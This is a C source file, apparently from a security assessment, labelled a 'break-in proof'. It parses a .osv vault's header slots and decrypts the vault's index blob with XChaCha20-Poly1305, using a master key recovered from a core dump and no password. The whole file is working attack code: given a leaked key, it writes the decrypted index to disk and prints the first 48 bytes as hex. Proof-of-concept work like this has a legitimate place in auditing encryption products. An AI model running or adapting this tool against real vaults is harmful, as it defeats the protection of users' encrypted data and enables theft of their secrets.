// Break-in proof (Phase 1): decrypt a .osv vault's index blob with a master key
// recovered from a core dump, using the vault's own header (slot offset/length/
// nonce) and Monocypher XChaCha20-Poly1305. No password is used anywhere.
//
// Usage: breakin <vault> <key_hex_64chars> [out_prefix]
//   out_prefix defaults to "./index_slot" (writes "<out_prefix><slot>.bin").
//
// Builds against the vendored Monocypher — see the Makefile in this directory.
#define _POSIX_C_SOURCE 200809L // fseeko / off_t (64-bit file offsets)
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <monocypher.h>

static uint32_t rd32(const uint8_t *p){ return (uint32_t)p[0] | ((uint32_t)p[1]<<8) | ((uint32_t)p[2]<<16) | ((uint32_t)p[3]<<24); }
static uint64_t rd64(const uint8_t *p){ uint64_t v=0; for(int i=7;i>=0;--i) v=(v<<8)|p[i]; return v; }

static int parse_key_hex(const char *s, uint8_t key[32])
{
    int nib=0;
    for(const char *c=s; *c && nib<64; ++c){
        int hi;
        if(*c>='0'&&*c<='9') hi=*c-'0';
        else if(*c>='a'&&*c<='f') hi=*c-'a'+10;
        else if(*c>='A'&&*c<='F') hi=*c-'A'+10;
        else continue; // spaces / ':' separators tolerated
        if((nib&1)==0) key[nib/2]=(uint8_t)(hi<<4); else key[nib/2]|=(uint8_t)hi;
        nib++;
    }
    return nib; // caller checks == 64
}

int main(int argc, char **argv)
{
    if(argc<3){ fprintf(stderr,"usage: %s <vault> <key_hex_64chars> [out_prefix]\n",argv[0]); return 2; }
    const char *path   = argv[1];
    const char *prefix = (argc>3) ? argv[3] : "./index_slot";

    uint8_t key[32];
    if(parse_key_hex(argv[2], key)!=64){ fprintf(stderr,"key hex did not parse to 32 bytes\n"); return 2; }

    FILE *f=fopen(path,"rb"); if(!f){ perror("fopen"); return 1; }
    uint8_t hdr[4096];
    if(fread(hdr,1,sizeof hdr,f)!=(size_t)sizeof hdr){ fprintf(stderr,"short header\n"); fclose(f); return 1; }

    const uint8_t  active = hdr[206];
    const uint32_t flags  = rd32(hdr+12);
    printf("flags=0x%08x active_slot=%u  (bit0=framed, bit1=domain-sep-kdf)\n", flags, active);

    struct slot { uint64_t off,len; uint8_t nonce[24]; } slot[2];
    slot[0].off=rd64(hdr+118); slot[0].len=rd64(hdr+126); memcpy(slot[0].nonce,hdr+134,24);
    slot[1].off=rd64(hdr+166); slot[1].len=rd64(hdr+174); memcpy(slot[1].nonce,hdr+182,24);
    for(int i=0;i<2;i++) printf("slot[%d]: offset=%llu length=%llu\n", i,
        (unsigned long long)slot[i].off, (unsigned long long)slot[i].len);

    // Try the active slot first, then the other.
    int order[2]={ (int)active, (int)(active^1) };
    int done=0;
    for(int oi=0; oi<2 && !done; oi++){
        int si=order[oi];
        uint64_t off=slot[si].off, len=slot[si].len;
        if(len<16){ printf("slot[%d]: len %llu < 16, skip\n",si,(unsigned long long)len); continue; }
        uint8_t *data=malloc(len);
        fseeko(f,(off_t)off,SEEK_SET);
        if(fread(data,1,len,f)!=(size_t)len){ printf("slot[%d]: short read\n",si); free(data); continue; }
        size_t clen=len-16;
        const uint8_t *cipher=data; const uint8_t *tag=data+len-16;
        uint8_t *plain=malloc(clen?clen:1);
        int rc=crypto_aead_unlock(plain, tag, key, slot[si].nonce, NULL, 0, cipher, clen);
        printf("slot[%d]: crypto_aead_unlock -> %s (plaintext %zu bytes)\n", si,
               rc==0?"TAG VERIFIED (success)":"AUTH FAILED", clen);
        if(rc==0){
            char out[512]; snprintf(out,sizeof out,"%s%d.bin",prefix,si);
            FILE *o=fopen(out,"wb"); if(o){ fwrite(plain,1,clen,o); fclose(o); }
            printf("wrote %s (%zu bytes)\n", out, clen);
            printf("--- first 48 bytes of decrypted index ---\n");
            int n=(clen<48)?(int)clen:48;
            for(int i2=0;i2<n;i2++) printf("%02x ",plain[i2]);
            printf("\n");
            done=1;
        }
        free(plain); free(data);
    }
    fclose(f);
    return done?0:1;
}
